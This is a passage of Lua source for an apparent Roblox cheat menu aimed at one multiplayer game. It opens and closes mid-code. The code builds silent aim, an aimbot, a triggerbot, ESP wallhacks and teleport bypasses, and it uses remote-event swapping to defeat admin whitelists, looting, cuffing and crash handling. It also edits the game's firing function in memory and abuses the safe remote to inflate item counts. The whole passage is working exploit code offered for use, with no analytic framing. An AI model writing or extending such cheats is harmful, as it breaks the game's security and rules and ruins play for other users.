            if localplayer.Character and typeof(localplayer.Character) == "Instance" then
                local humanoid = localplayer.Character:FindFirstChildWhichIsA("Humanoid")
                if humanoid and typeof(humanoid) == "Instance" then
                    local seatpart = humanoid.SeatPart
                    if seatpart and typeof(seatpart) == "Instance" and isa(seatpart,"VehicleSeat") then
                        seatpart.AssemblyLinearVelocity *= Vector3.new(0, 0, 0)
                        seatpart.AssemblyAngularVelocity *= Vector3.new(0, 0, 0)
                    end
                end
            end
        end
    end
end)
uis.InputBegan:Connect(function(input,gameProcessedEvent)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and sl2.vehicle.carteleportenabled and uis:IsKeyDown(sl2.vehicle.carteleportbind) and (not gameProcessedEvent) then
        if utility:getcharacter(localplayer) and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid") and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").SeatPart then
            Car = findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").SeatPart.Parent
            local cast = utility:getmousecast()
            if Car and cast then
                Car.PrimaryPart = findfirstchildofclass(Car.Body,"Part")
                Car:SetPrimaryPartCFrame(CFrame.new(cast.Position + Vector3.new(0,5,0)))
            end
        end
    end
end)
task.spawn(function()
    while true do
        task.wait(0)
        if sl2.vehicle.speedenabled and uis:IsKeyDown(Enum.KeyCode.W) then
            if localplayer.Character and localplayer.Character:FindFirstChild("Humanoid") then
                if localplayer.Character and typeof(localplayer.Character) == "Instance" then
                    local humanoid = localplayer.Character:FindFirstChildWhichIsA("Humanoid")
                    if humanoid and typeof(humanoid) == "Instance" then
                        local seatpart = humanoid.SeatPart
                        if seatpart and typeof(seatpart) == "Instance" and isa(seatpart,"VehicleSeat") then
                            seatpart.AssemblyLinearVelocity *= Vector3.new(1 + sl2.vehicle.speedamount, 1, 1 + sl2.vehicle.speedamount)
                        end
                    end
                end
            end
        end
    end
end)
task.spawn(function()
    while true do
        task.wait(0)
        if sl2.vehicle.breakenabled and uis:IsKeyDown(Enum.KeyCode.S) then
            if localplayer.Character and localplayer.Character:FindFirstChild("Humanoid") then
                if localplayer.Character and typeof(localplayer.Character) == "Instance" then
                    local humanoid = localplayer.Character:FindFirstChildWhichIsA("Humanoid")
                    if humanoid and typeof(humanoid) == "Instance" then
                        local seatpart = humanoid.SeatPart
                        if seatpart and typeof(seatpart) == "Instance" and isa(seatpart,"VehicleSeat") then
                            seatpart.AssemblyLinearVelocity *= Vector3.new(1 - sl2.vehicle.breakspeed, 1, 1 - sl2.vehicle.breakspeed)
                        end
                    end
                end
            end
        end
    end
end)
TeleportBox:AddDropdown('TeleportTarget', {SpecialType = 'Player', Text = 'Target Player', Multi = false, Callback = function(Value)
    if Value then sl2.exploits.player.teleporttarget = findfirstchild(players,Value) else sl2.exploits.player.teleporttarget = nil end
end})
TeleportBox:AddButton('Teleport To Player', function() 
    if findfirstchild(players,tostring(sl2.exploits.player.teleporttarget)) and utility:getroot(sl2.exploits.player.teleporttarget) then
        if utility:getcharacter(localplayer) and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid") and tostring(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").SeatPart) == "DriveSeat" then
            utility.car.PrimaryPart = findfirstchildofclass(utility.car.Body,"Part")
            utility.car:SetPrimaryPartCFrame(utility:getroot(sl2.exploits.player.teleporttarget).CFrame + Vector3.new(0,4.5,0))
        else
            sl2.exploits.bypass(utility:getroot(sl2.exploits.player.teleporttarget).CFrame)
        end
    else
        Library:Notify("Error : Player is not rendered!",5)
    end
end)
TeleportBox:AddToggle('ClickTeleport', { Text = 'Click Teleport', Default = false, Callback = function(x)
    sl2.exploits.player.clicktp = x
end}):AddKeyPicker('ClickBind', {Default = 'LeftControl',SyncToggleState = false, Mode = 'Hold', Text = '', NoUI = false,Callback = function() end,ChangedCallback = function(N)
    sl2.exploits.player.clicktpbind = N
end})
uis.InputBegan:Connect(function(input,gameProcessedEvent)
    if not sl2.exploits.player.clicktp then
        return
    end
    if input.UserInputType == Enum.UserInputType.MouseButton1 and uis:IsKeyDown(sl2.exploits.player.clicktpbind) and (not gameProcessedEvent) and (not utility:getgun()) then
        local cast = utility:getmousecast()
        if cast then
            task.wait()
            sl2.exploits.bypass(CFrame.new(cast.Position + Vector3.new(0,3.5,0)))
        end
    end
end)
TeleportBox:AddToggle('SpawnTeleport', { Text = 'Teleport To Player On Spawn', Default = false,Callback = function(z)
    sl2.exploits.player.teleportonspawn = z
end})
TeleportBox:AddToggle('RespawnTeleport', { Text = 'Teleport To Death Place', Default = false,Callback = function(z)
    sl2.exploits.player.respawn = z
end})
TeleportBox:AddDivider()

TeleportBox:AddDropdown('TeleportToArea', {Values = sl2.locations.names, Text = 'Teleport To Area', Multi = false, AllowNull = true, Callback = function(Value)
    if Value ~= nil and tostring(Value) ~= "nil" and tostring(Value) ~= "" and tostring(Value) ~= "false" then
        if utility:getcharacter(localplayer) and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid") and tostring(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").SeatPart) == "DriveSeat" then
            utility.car.PrimaryPart = findfirstchildofclass(utility.car.Body,"Part")
            utility.car:SetPrimaryPartCFrame(sl2.locations.frames[Value] + Vector3.new(0,6,0))
            task.wait((game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() + 125) / 1000)
            Options.TeleportToArea:SetValue()
        else
            sl2.exploits.bypass(sl2.locations.frames[Value])
            Options.TeleportToArea:SetValue()
        end
    end
end})

TeleportBox:AddDropdown('BringWhitelist', {SpecialType = "Player", Text = 'Bring Whitelist', Multi = true, AllowNull = true, Callback = function(Value)
    table.clear(sl2.exploits.bringwhitelist)

    for i,v in Value do
        table.insert(sl2.exploits.bringwhitelist, tostring(i))
    end
end})

local ExtraGunMods = Tabs.Main:AddLeftGroupbox('Beta Gun Mods')

GunModBox:AddToggle('WLBypass', { Text = 'Admin Whitelist Bypass', Default = false, Callback = function(v)
    sl2.exploits.gunmods.whitelist = v
    if sl2.exploits.gunmods.whitelist then
        sl2.exploits.remotes.fakeequip.Parent = replicatedstorage.GunRemotes
        sl2.exploits.remotes.realequip.Parent = utility.fakefolder
    else
        sl2.exploits.remotes.realequip.Parent = replicatedstorage.GunRemotes
        sl2.exploits.remotes.fakeequip.Parent = utility.fakefolder
    end
end})
if utility.solara  then
    GunModBox:AddButton("Infinite Ammo + Anti Jam",function()
        GunStats = findfirstchildofclass(utility:getcharacter(localplayer),"Tool").Stats
        GunStats.ClipSize.Value = 1
        GunStats.ClipSize:GetPropertyChangedSignal("Value"):Connect(function()
            GunStats.ClipSize.Value = 1
        end)
    end)
    GunModBox:AddButton("Automatic Gun",function()
        GunStats = findfirstchildofclass(utility:getcharacter(localplayer),"Tool").Stats
        GunStats.FireRate.Value = -1
        GunStats.GunType.Value = "Auto"
    end)
    GunModBox:AddToggle('Recoil Reducer', { Text = 'Recoil Reducer', Default = false, Callback = function(v)
        sl2.exploits.gunmods.norecoil = v
    end})
    GunModBox:AddSlider('recoilvalue', { Text = 'Recoil Value', HideMax = true,  Default = 100, Min = 1, Max = 100, Rounding = 0, Compact = true, Callback = function(v)
        sl2.exploits.gunmods.recoilvalue = v
    end})
else
    GunModBox:AddToggle('infam', { Text = 'Infinite Ammo + Anti Jam', Default = false, Callback = function(v)  
        sl2.exploits.gunmods.infiniteammo = v
    end})
    GunModBox:AddToggle('InstantShoot', { Text = 'Instant Shoot', Default = false,Callback = function(x)
        sl2.exploits.gunmods.instantshoot = x
    end})
    GunModBox:AddToggle('fulauto', { Text = 'Automatic Gun', Default = false, Callback = function(v)
        sl2.exploits.gunmods.automaticgun = v
    end})
    GunModBox:AddToggle('Recoil Reducer', { Text = 'Recoil Reducer', Default = false, Callback = function(v)
        sl2.exploits.gunmods.norecoil = v
    end})
    GunModBox:AddSlider('recoilvalue', { Text = 'Recoil Value', Suffix = "%", HideMax = true, Default = 100, Min = 1, Max = 100, Rounding = 0, Compact = true, Callback = function(v)
        sl2.exploits.gunmods.recoilvalue = v
    end})
end
if utility.solara == false then
    ExtraGunMods:AddToggle('Spread', { Text = 'No Spread', Default = false, Callback = function(v)
        sl2.exploits.gunmods.nospread = v
    end})
end
ExtraGunMods:AddToggle('Rifle', {Text = 'No Rifle',Default = false,Callback = function(v)
    sl2.exploits.gunmods.norifle = v
end})
LocalPlayerBox:AddToggle('InstaPrompt', {Text = 'Instant Prompt',Default = false,Callback = function(v)
    sl2.exploits.player.instantprompt = v
end})
LocalPlayerBox:AddToggle('Anti Loot', {Text = 'Anti Loot',Default = false,Callback = function(v)
    if v then
        sl2.exploits.remotes.realloot.Parent = utility.fakefolder
        sl2.exploits.remotes.fakeloot.Parent = replicatedstorage.UI
    else
        sl2.exploits.remotes.fakeloot.Parent = utility.fakefolder
        sl2.exploits.remotes.realloot.Parent = replicatedstorage.UI
    end
end})
LocalPlayerBox:AddToggle('Anti-Cuff', {Text = 'Anti Cuff',Default = false,Callback = function(v)
    sl2.exploits.player.anticuff = v
end})
--[[LocalPlayerBox:AddToggle('Aura', {Text = 'Stab Aura',Default = false,Callback = function(v)
    sl2.exploits.player.stabaura = v
end})]]
LocalPlayerBox:AddToggle('Auto-Pick', {Text = 'Auto Pick Up',Default = false,Callback = function(v)
    sl2.exploits.player.autopickup = v
end})      
LocalPlayerBox:AddToggle('Inf-Skittles', { Text = 'Infinite Skittles', Default = false,Callback = function(v)
    sl2.exploits.player.infiniteskittles = v
end})
LocalPlayerBox:AddToggle('InfStamina', { Text = 'Infinite Stamina', Default = false,Callback = function(v)
    sl2.exploits.player.infinitestamina = v
    localplayer.Valuestats.Stamina.Value = sl2.exploits.player.infinitestamina == true and 9e9 or sl2.exploits.player.infinitestamina == false and 100
end})
LocalPlayerBox:AddToggle('SafeSlots', { Text = 'Max Safe Slots', Default = false,Callback = function(x)
    sl2.exploits.player.safeslots = x
end})
ExtraPlayerBox:AddToggle('Anti Apartment', { Text = 'Anti Apartment Check', Default = false,Callback = function(x)
    sl2.exploits.player.antiapartmentcheck = x
end})
ExtraPlayerBox:AddToggle('Hood', { Text = 'Anti Hood Pull', Default = false,Callback = function(x)
    sl2.exploits.player.antihood = x
end})
ExtraPlayerBox:AddToggle('Camerabob', { Text = 'Anti Camera Bob', Default = false,Callback = function(x)
    sl2.exploits.player.anticambob = x
end})
ExtraPlayerBox:AddToggle('Anti Crash', { Text = 'Anti Crash', Default = false, Callback = function(v)
    if v then
        sl2.exploits.remotes.realcrash.Parent = utility.fakefolder
        sl2.exploits.remotes.fakecrash.Parent = replicatedstorage
    else
        sl2.exploits.remotes.fakecrash.Parent = utility.fakefolder
        sl2.exploits.remotes.realcrash.Parent = replicatedstorage
    end
end})
ExtraPlayerBox:AddToggle('AntiRag', {Text = 'Anti Ragdoll', Default = false, Callback = function(x)
    sl2.exploits.player.antiragdoll = x
end})
ExtraPlayerBox:AddToggle('MetCar', { Text = 'Bypass Locked Cars', Default = false, Callback = function(x)
    sl2.vehicle.bypasslocked = x
end})
SafeBox:AddToggle('SafeGunsDead', { Text = 'Safe Guns When You Die', Default = false, Callback = function(x)
    sl2.exploits.safe.safegunsondeath = x
end})
SafeBox:AddToggle('MxClips', { Text = 'Max Clips/Uses On Item', Default = false, Callback = function(x)
    sl2.exploits.safe.maxclips = x
end})
SafeBox:AddDropdown('SafeDropDown', { Values = {}, Default = '', Multi = false, AllowNull = true, Text = 'Take Gun', Callback = function(Val)
    if tostring(Val) ~= "" and Val ~= nil and tostring(Val) ~= "nil" and tostring(Val) ~= "false" then
        replicatedstorage.UI.Safe:FireServer("Takeout",sl2.exploits.safe.getitem(Val).Value,sl2.exploits.safe.getitem(Val):FindFirstChildOfClass("IntValue").Value,sl2.exploits.safe.playertowhitelist)
        Options.SafeDropDown:SetValue()
    end
end})
SafeBox:AddDropdown('PuttingDropDown', { Values = {}, Default = '', Multi = false, AllowNull = true, Text = 'Safe Gun', Callback = function(v)
    if tostring(v) ~= "" and v ~= nil and tostring(v) ~= "nil" and tostring(v) ~= "false" then
        Clips = sl2.exploits.safe.maxclips and 999999999999999999 or localplayer.Backpack[v]:FindFirstChild("Stats") and localplayer.Backpack[v]:FindFirstChild("Stats").MaxAmmo.Value or localplayer.Backpack[v]:FindFirstChild("USES") and localplayer.Backpack[v]:FindFirstChild("USES").Value or localplayer.Backpack[v]:FindFirstChild("val") and localplayer.Backpack[v]:FindFirstChild("val").Value
        replicatedstorage.UI.Safe:FireServer("Movetosafe",v,Clips,sl2.exploits.safe.playertowhitelist)
        Options.PuttingDropDown:SetValue()
    end
end})
SafeBox:AddDropdown('WhitelistSafe', { SpecialType = 'Player', Text = 'Player To Whitelist', Multi = false, Callback = function(Value)
    if Value then sl2.exploits.safe.playertowhitelist = findfirstchild(players,Value).UserId else sl2.exploits.safe.playertowhitelist = localplayer.UserId end
end})
Options["WhitelistSafe"]:SetValue(tostring(localplayer))
local Triggerbox = Tabs.Aiming:AddLeftGroupbox('Triggerbot')
local AimbotBox = Tabs.Aiming:AddLeftGroupbox('Aimbot')
local SilentBox = Tabs.Aiming:AddRightGroupbox('Silent') 
SilentBox:AddToggle('SilentEnabled', { Text = 'Enabled', Default = false, Risky = false, Callback = function(v)
        sl2.aiming.silent.enabled = v
end})
SilentBox:AddLabel('Keybind'):AddKeyPicker('SilentBind', { Default = 'nil', SyncToggleState = false, Mode = 'Toggle', Text = '',  NoUI = false, Callback = function() end, ChangedCallback = function(New)
        sl2.aiming.silent.keybind = New
end})
SilentBox:AddDropdown('SilentPart', { Values = { 'Head','HumanoidRootPart' }, Default = 1, Multi = false, Text = 'Target Part', Callback = function(v)
        sl2.aiming.silent.targetpart = v
end})
local silentclosest
SilentBox:AddDropdown('TargetMode', { Values = { 'Auto','Target' }, Default = 1, Multi = false, Text = 'Targetting Mode', Callback = function(v)
    silentclosest = nil
    sl2.aiming.silent.targetmode = v
end})
SilentBox:AddToggle('SilentFriend', {Text = 'Friend Check', Default = false, Callback = function(v)
    sl2.aiming.silent.friendcheck = v
end})
SilentBox:AddToggle('SilentVis', {Text = 'Visible Check',Default = false,Callback = function(v)
    sl2.aiming.silent.visiblecheck = v
end
})
SilentBox:AddToggle('SilentAlive', {Text = 'Alive Check',Default = false,Callback = function(v)
        sl2.aiming.silent.alivecheck = v
end})
if game['PlaceId'] ~= 4779613061 then
    SilentBox:AddToggle('Wallbang', {Text = 'Wall Bang',Default = false,Callback = function(v)
            sl2.aiming.silent.wallbang = v
        end
    })
end
SilentBox:AddSlider('SilentHitChance', { Text = 'Hit Chance', Default = 100, Min = 0, Max = 100, Rounding = 0, Compact = true, Callback = function(v)
        sl2.aiming.silent.hitchance = v
end})
local silentfovbox = Tabs.Aiming:AddRightGroupbox('Silent FOV')
silentfovbox:AddToggle('silentdrawfov', { Text = 'Show FOV', Default = false, Callback = function(v)
        sl2.aiming.silent.showfov = v
end}):AddColorPicker('silentFOVCOLOR', { Default = Color3.new(1, 1, 1), Title = 'FOV Color', Transparency = nil, Callback = function(v)
        sl2.aiming.silent.fovcolor = v
end})
silentfovbox:AddSlider('silentfovradius', { Text = 'Radius', Default = 100, Min = 0, Max = 800, Rounding = 0, Compact = false, Callback = function(v)
        sl2.aiming.silent.fovradius = v
end})
silentfovbox:AddSlider('silentfovsides', { Text = 'Sides', Default = 100, Min = 3, Max = 100, Rounding = 0, Compact = false, Callback = function(v)
        sl2.aiming.silent.fovsides = v
end})
local silentsnaplinebox = Tabs.Aiming:AddRightGroupbox('Silent Snapline')
silentsnaplinebox:AddToggle('silentsilentsilentsilent', { Text = 'Enabled', Default = false, Callback = function(v)
        sl2.aiming.silent.snapline = v
end}):AddColorPicker('FakeSnapline', { Default = Color3.new(1, 1, 1), Title = 'Snapline Color', Transparency = nil, Callback = function(v)
        sl2.aiming.silent.snaplinecolor = v
end})
local silentwlbox = Tabs.Aiming:AddRightGroupbox('Silent Whitelist')
silentwlbox:AddDropdown('SilentWL', { SpecialType = 'Player', Text = 'Select Player', Multi = true,Callback = function(x)
    table.clear(sl2.aiming.silent.whitelist.cache)
    table.clear(sl2.aiming.silent.whitelist.whitelisted)
    table.insert(sl2.aiming.silent.whitelist.cache,x) 
    for _,v in next, sl2.aiming.silent.whitelist.cache do   
        for k,z in next, v do
            table.insert(sl2.aiming.silent.whitelist.whitelisted,k)
        end
    end
end})

Triggerbox:AddToggle('Triggerbot',{ Text = 'Enabled', Default = false, Risky = false, Callback = function(v)
    sl2.aiming.aimbot.triggerbotenabled = v
end})
Triggerbox:AddLabel('Keybind'):AddKeyPicker('TriggerBind', {Default = 'V', SyncToggleState = false, Mode = 'Toggle', Text = '',  NoUI = false, Callback = function() end, ChangedCallback = function(New)
    sl2.aiming.aimbot.triggerbotbind = New
end})
Triggerbox:AddDropdown('Mode', { Values = { 'Blatant','Legit' }, Default = 1, Multi = false, Text = 'Trigger Mode', Callback = function(v)
    sl2.aiming.aimbot.triggerbotmode = v
end})
Triggerbox:AddDropdown('Settings', { Values = { 'Hold Key'; 'Hand Guns'; 'Very Blatant'}, Default = {"Hold Key"}, Multi = true, Text = 'Trigger Settings', Callback = function(x)
    table.clear(sl2.aiming.aimbot.triggersettings.cache)
    table.clear(sl2.aiming.aimbot.triggersettings.real)
    table.insert(sl2.aiming.silent.whitelist.cache,x) 
    for _,v in next, sl2.aiming.silent.whitelist.cache do   
        for k,z in next, v do
            if k == "Hold Key" then
                table.insert(sl2.aiming.aimbot.triggersettings.real,tostring(k):lower())
            elseif k == "Very Blatant" then
                table.insert(sl2.aiming.aimbot.triggersettings.real,"veryblatant")
            elseif k == "Hand Guns" then
                table.insert(sl2.aiming.aimbot.triggersettings.real,"hand guns")
            end
        end
    end
end})
Triggerbox:AddSlider('Response Time', {Suffix = "ms", Text = 'Response Time', Default = 10, Min = 0, Max = 250, Rounding = 0, Compact = true})
spawn(function()
    while true do
        task.wait(Options["Response Time"].Value / 1000)
        utility:trigger()
    end
end)
AimbotBox:AddToggle('AimbotEnabled', { Text = 'Enabled', Default = false, Callback = function(v)
    sl2.aiming.aimbot.enabled = v
end})
AimbotBox:AddLabel('Keybind'):AddKeyPicker('AimbotBind', {Default = 'nil', SyncToggleState = false, Mode = 'Toggle', Text = '',  NoUI = false, Callback = function() end, ChangedCallback = function(New)
    sl2.aiming.aimbot.keybind = New
end})
AimbotBox:AddDropdown('AimPart', { Values = { 'Head','HumanoidRootPart' }, Default = 1, Multi = false, Text = 'Target Part', Callback = function(v)
    sl2.aiming.aimbot.targetpart = v
end})
AimbotBox:AddToggle('AimbotFriend', { Text = 'Friend Check', Default = false, Callback = function(v)
    sl2.aiming.aimbot.friendcheck = v
end})
AimbotBox:AddToggle('AimbotVisible', { Text = 'Visible Check', Default = false, Callback = function(v)
    sl2.aiming.aimbot.visiblecheck = v
end})
AimbotBox:AddToggle('AimbotAlive', { Text = 'Alive Check', Default = false, Callback = function(v)
    sl2.aiming.aimbot.alivecheck = v
end})
local AimbotFoxBox = Tabs.Aiming:AddLeftGroupbox('Aimbot FOV')
AimbotFoxBox:AddToggle('aimbotdrawfov', { Text = 'Show FOV', Default = false, Callback = function(v)
    sl2.aiming.aimbot.showfov = v
end}):AddColorPicker('AimbotFOVCOLOR', { Default = Color3.new(1, 1, 1), Title = 'FOV Color', Transparency = nil, Callback = function(v)
    sl2.aiming.aimbot.fovcolor = v
end})
AimbotFoxBox:AddSlider('aimbotfovradius', { Text = 'Radius', Default = 100, Min = 0, Max = 800, Rounding = 0, Compact = false, Callback = function(v)
    sl2.aiming.aimbot.fovradius = v
end})
AimbotFoxBox:AddSlider('aimbotfovsides', { Text = 'Sides', Default = 100, Min = 3, Max = 100, Rounding = 0, Compact = false, Callback = function(v)
    sl2.aiming.aimbot.fovsides = v
end})
local AimbotSnapLineBox = Tabs.Aiming:AddLeftGroupbox('Aimbot Snapline')
AimbotSnapLineBox:AddToggle('goway', { Text = 'Enabled', Default = false, Callback = function(v)
    sl2.aiming.aimbot.snapline = v
end}):AddColorPicker('FakeSnapline', { Default = Color3.new(1, 1, 1), Title = 'Snapline Color', Transparency = nil, Callback = function(v)
    sl2.aiming.aimbot.snaplinecolor = v
end})
local AimbotSmoothingBox = Tabs.Aiming:AddLeftGroupbox('Smoothing')
AimbotSmoothingBox:AddSlider('smoothingslider', { Text = 'Smoothing', Default = 0, Min = 0, Max = 2, Rounding = 2, Compact = false, Callback = function(v)
    sl2.aiming.aimbot.smoothing = v
end})
AimbotSmoothingBox:AddDropdown('Easing Style', { Values = {"Linear", "Sine", "Quad", "Cubic", "Quart", "Quint", "Exponential"}, Default = 1, Multi = false, Text = 'Easing Style', Callback = function(v)
    sl2.aiming.aimbot.smoothingstyle = Enum.EasingStyle[v]
end})
AimbotSmoothingBox:AddDropdown('Easing Direction', { Values = {"InOut", "In", "Out"}, Default = 1, Multi = false, Text = 'Easing Direction', Callback = function(v)
    sl2.aiming.aimbot.easingdirection = Enum.EasingDirection[v]
end})
local ESPBox = Tabs.Visuals:AddLeftGroupbox('ESP')
ESPBox:AddToggle('ESPEnabled', { Text = 'Enabled', Default = false, Callback = function(v)
    esplibrary.enabled = v
end})
ESPBox:AddToggle('EspBoxes', { Text = 'Boxes', Default = false, Callback = function(v)
    esplibrary.boxes.enabled = v
end})
ESPBox:AddToggle('HealthBars', { Text = 'Healthbars', Default = false, Callback = function(v)
    esplibrary.healthbars.enabled = v
end})
ESPBox:AddToggle('healthtext', { Text = 'Health text', Default = false, Callback = function(v)
    esplibrary.healthtext.enabled = v
end})
ESPBox:AddToggle('names', { Text = 'Names', Default = false, Callback = function(v)
    esplibrary.names.enabled = v
end})
ESPBox:AddToggle('distance', { Text = 'Distance', Default = false, Callback = function(v)
    esplibrary.distance.enabled = v
end})
ESPBox:AddToggle('weapon', { Text = 'Weapon', Default = false, Callback = function(v)
    esplibrary.weapon.enabled = v
end})
local chamclr = ESPBox:AddToggle('Chams', { Text = 'Chams', Default = false, Callback = function(v)
    esplibrary.chams.enabled = v
end})
chamclr:AddColorPicker('chamst', { Default = Color3.fromRGB(255,255,255), Title = 'Cham Color', Transparency = 0, Callback = function(Value)
    esplibrary.chams.color = Value
end})
local glowclr = ESPBox:AddToggle('Glow', { Text = 'Glow', Default = false, Callback = function(v)
    esplibrary.glow.enabled = v
end})
glowclr:AddColorPicker('glowt', { Default = Color3.fromRGB(255,255,255), Title = 'Glow Color', Transparency = 0, Callback = function(Value)
    esplibrary.glow.color = Value
end})

local EspSettings = Tabs.Visuals:AddLeftGroupbox('ESP Settings')
EspSettings:AddDropdown('Type', { Values = {"Bounding","3D"}, Default = 1, Multi = false, Text = 'Bounding Style', Callback = function(v)
    esplibrary.boxes['type'] = v
end})
EspSettings:AddToggle('Namedisplay', { Text = 'Name Uses DisplayName', Default = false, Callback = function(v)
    esplibrary.names.displaynames = v
end})
EspSettings:AddDropdown('Measuremtn', { Values = {"Meters","Studs"}, Default = 1, Multi = false, Text = 'Distance Measurement', Callback = function(v)
    if v == "Meters" then
        esplibrary.distance_measurement = "m"
        esplibrary.distance_format = 0.4
    else
        esplibrary.distance_measurement = "s"
        esplibrary.distance_format = 1
    end
end})
esplibrary.textsize = 11
esplibrary.textfont = 2
local Fonts = {"0","1","2","3"}
EspSettings:AddDropdown('FontEsp', { Values = Fonts, Default = "2", Multi = false, Text = 'Font', Callback = function(v)
    esplibrary.textfont = tonumber(v)
end})
EspSettings:AddSlider('textsiize', { Text = 'Text Size', Default = 11, Min = 0, Max = 16, Rounding = 0, Compact = false, Callback = function(v)
    esplibrary.textsize = v
end})
EspSettings:AddSlider('MaxDis', { Text = 'Max Distance', Default = 3000, Min = 0, Max = 6000, Rounding = 0, Compact = false, Callback = function(v)
    esplibrary.maxdistance = v
end})
EspSettings:AddButton('Show Real Names', function()
    while task.wait(3) do 
        for _, __ in pairs(game.Players:GetPlayers()) do
            if __.Character and __.Character:FindFirstChild("Head") then
                if tostring(__) ~= tostring(localplayer) then
                    if __.Character.Head:FindFirstChild("Gui"):FindFirstChild("MainFrame") then
                        __.Character.Head:FindFirstChild("Gui"):FindFirstChild("MainFrame"):FindFirstChild("NameLabel").Text = tostring(__)
                    end
                end
            end
        end
    end
end)
local EspColors = Tabs.Visuals:AddRightGroupbox('ESP Colors')
EspColors:AddLabel('Box'):AddColorPicker('BoxColor', { Default = Color3.new(1, 1, 1), Title = 'Box color', Transparency = 0, Callback = function(v)
    esplibrary.boxes.color = v
end})
EspColors:AddLabel('Name'):AddColorPicker('NameColor', { Default = Color3.new(1, 1, 1), Title = 'Name color', Transparency = 0, Callback = function(v)
    esplibrary.names.color = v
end})
EspColors:AddLabel('Distance'):AddColorPicker('DistanceColor', { Default = Color3.new(1, 1, 1), Title = 'Distance color', Transparency = 0, Callback = function(v)
    esplibrary.distance.color = v
end})
EspColors:AddLabel('Weapon'):AddColorPicker('WeaponColor', { Default = Color3.new(1, 1, 1), Title = 'Weapon color', Transparency = 0, Callback = function(v)
    esplibrary.weapon.color = v
end})
local WorldColors = nil
if EspColors then
    WorldColors = Tabs.Visuals:AddRightGroupbox('World')
else
    WorldColors = Tabs.Visuals:AddLeftGroupbox('World')
end
WorldColors:AddToggle('AmbientColor', { Text = 'Ambient Color', Default = false, Callback = function(v)
        sl2.visuals.world.changeambient = v
end})
WorldColors:AddLabel('Color'):AddColorPicker('AmbientClr', { Default = Color3.new(1, 1, 1), Title = 'Color', Transparency = 0, Callback = function(v)
        sl2.visuals.world.ambient = v
end})
WorldColors:AddToggle('FogColor', { Text = 'Fog Color', Default = false, Callback = function(v)
        sl2.visuals.world.changefogcolor = v
end})
WorldColors:AddLabel('Color'):AddColorPicker('FogClr', { Default = Color3.new(1, 1, 1), Title = 'Color', Transparency = 0, Callback = function(v)
        sl2.visuals.world.fogcolor = v
end})
WorldColors:AddToggle('FOVtoggle', { Text = 'FOV', Default = false, Callback = function(v)
        sl2.visuals.world.changefov = v
end})
WorldColors:AddSlider('fovval', { Text = 'Value', Default = 70, Min = 0, Max = 120, Rounding = 0, Compact = false, Callback = function(v)
        sl2.visuals.world.fov = v
end})
WorldColors:AddToggle('SaturationToggle', {Text = 'Saturation', Default = false, Callback = function(v)
    sl2.visuals.world.changesaturation = v
end})
WorldColors:AddSlider('SaturationValue', {Text = 'Value', Default = 1, Min = 0, Max = 2, Rounding = 2, Compact = false, Callback = function(v)
    sl2.visuals.world.saturation = v
end})
if getgc and debug.setupvalue then
    localplayer.CharacterAdded:Connect(function(Character)
        task.wait(2)
        task.spawn(function()
            for _, v in next, getgc(true) do
                if type(v) == "function" then
                    funcinfo = debug.getinfo(v)
                    if funcinfo.source == "=Players." .. tostring(localplayer) .. ".Backpack.FirearmLocal" then
                        if tostring(funcinfo.name) == "OnFire" then
                            Character.ChildAdded:Connect(function(__)
                                if __.ClassName == "Tool" and __:FindFirstChild("Stats") and sl2.exploits.gunmods.instantshoot == true then
                                    debug.setupvalue(v, 1, true)
                                end
                            end)
                        end
                    end
                end
            end
        end)
    end)
    task.spawn(function()
        for _, v in next, getgc(true) do
            if type(v) == "function" then
                funcinfo = debug.getinfo(v)
                if funcinfo.source == "=Players." .. tostring(localplayer) .. ".Backpack.FirearmLocal" then
                    if tostring(funcinfo.name) == "OnFire" then
                        localplayer.Character.ChildAdded:Connect(function(__)
                            if __.ClassName == "Tool" and __:FindFirstChild("Stats") and sl2.exploits.gunmods.instantshoot == true then
                                debug.setupvalue(v, 1, true)
                            end
                        end)
                    end
                end
            end
        end
    end)
end
function ReturnSafeStats()
    local Safe = {}
    for i,v in next, localplayer.SafeStats:GetChildren() do
        if tostring(v.Value) == "nil" then continue end
        table.insert(Safe,v.Value)
    end
    table.sort(Safe,function(a,b) return a<b end)
    Options.SafeDropDown:SetValues(Safe)
end
ReturnSafeStats()
for i,v in pairs(localplayer.SafeStats:GetChildren()) do
    v:GetPropertyChangedSignal("Value"):Connect(ReturnSafeStats)
end
function ReturnBackpack()
    pcall(function()
        local Backpack = {}
        RattyTools = {"Fist","Phone","Skittles","Gear Cloner"}
        for i,v in next, localplayer.Backpack:GetChildren() do
            if isa(v,"Tool") and not table.find(RattyTools,tostring(v)) then
                table.insert(Backpack,tostring(v))
            end
        end
        table.sort(Backpack,function(a,b) return a<b end)
        Options.PuttingDropDown:SetValues(Backpack);
    end)
end
ReturnBackpack()
function connectbackpacks()
    localplayer:WaitForChild("Backpack")
    ReturnBackpack()
    localplayer.Backpack.ChildAdded:Connect(ReturnBackpack)
    localplayer.Backpack.ChildRemoved:Connect(ReturnBackpack)
end connectbackpacks()
localplayer.CharacterAdded:Connect(connectbackpacks)
-- you can remove things you dont want
local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
-- I set NoUI so it does not show up in the keybinds menu
MenuGroup:AddButton('Unload', function() Library:Unload() end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
ThemeManager:SetLibrary(Library)
ThemeManager:SetFolder('sl2.joyces')
ThemeManager:ApplyToTab(Tabs['UI Settings']) -- if you gonna change UI Settings in the tabs you need to replace this as well for themes
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
SaveManager:SetFolder('sl2.joyces/games/'..game.PlaceId)
SaveManager:BuildConfigSection(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()
function utility:getclosestplayertomouse(fovradius, friendcheck, alivecheck, vischeck,silentwlcheck)
    local curdistance, plr = fovradius
    local targetpart = sl2.aiming.aimbot.targetpart
    for _, player in pairs(getplayers(game:GetService('Players'))) do
        if player ~= localplayer and player.Character then
            local targetpart = findfirstchild(player.Character, targetpart)
            if targetpart then
